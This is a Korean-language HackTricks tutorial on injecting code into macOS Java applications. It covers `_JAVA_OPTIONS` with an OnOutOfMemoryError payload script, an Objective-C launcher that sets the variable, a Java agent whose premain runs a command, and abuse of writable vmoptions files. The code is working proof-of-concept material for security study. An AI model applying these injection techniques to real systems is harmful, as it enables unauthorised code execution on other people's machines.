# macOS Java 애플리케이션 주입

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## 열거

시스템에 설치된 Java 애플리케이션을 찾으세요. **Info.plist**에 있는 Java 앱은 **`java.`** 문자열을 포함하는 일부 Java 매개변수를 포함하고 있음을 알 수 있습니다. 따라서 해당 문자열을 검색할 수 있습니다:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA\_OPTIONS

환경 변수 **`_JAVA_OPTIONS`**은 java로 컴파일된 앱의 실행에 임의의 java 매개변수를 주입하는 데 사용될 수 있습니다:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
새로운 프로세스로 실행하고 현재 터미널의 자식으로 실행하지 않으려면 다음을 사용할 수 있습니다:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
그러나, 실행된 앱에서 오류를 발생시킬 것이므로, 더 은밀한 방법은 자바 에이전트를 생성하고 다음을 사용하는 것입니다:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
{% hint style="danger" %}
애플리케이션과 다른 Java 버전으로 에이전트를 생성하면, 에이전트와 애플리케이션의 실행이 모두 중단될 수 있습니다.
{% endhint %}

에이전트는 다음과 같을 수 있습니다:

{% code title="Agent.java" %}
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
{% endcode %}

에이전트를 컴파일하려면 다음을 실행하세요:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` 파일을 사용하여:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
그런 다음 환경 변수를 내보내고 다음과 같이 Java 애플리케이션을 실행합니다:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions 파일

이 파일은 Java가 실행될 때 **Java 매개변수**의 지정을 지원합니다. 이전의 몇 가지 기법을 사용하여 Java 매개변수를 변경하고 **프로세스가 임의의 명령을 실행하도록** 할 수 있습니다.\
또한, 이 파일은 `include` 디렉토리를 통해 다른 파일을 **포함**할 수도 있으므로 포함된 파일도 변경할 수 있습니다.

더욱이, 일부 Java 앱은 **`vmoptions` 파일을 여러 개** 로드할 수 있습니다.

Android Studio와 같은 일부 애플리케이션은 이러한 파일을 찾는 위치를 **출력**으로 알려줍니다. 예를 들어:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
그렇지 않다면 쉽게 다음과 같이 확인할 수 있습니다:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
흥미로운 점은 이 예시에서 Android Studio가 **`/Applications/Android Studio.app.vmoptions`** 파일을 로드하려고 한다는 것입니다. 이 파일은 **`admin` 그룹의 모든 사용자가 쓰기 권한을 가지고 있는 곳입니다.**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기교를 공유**하세요.

</details>
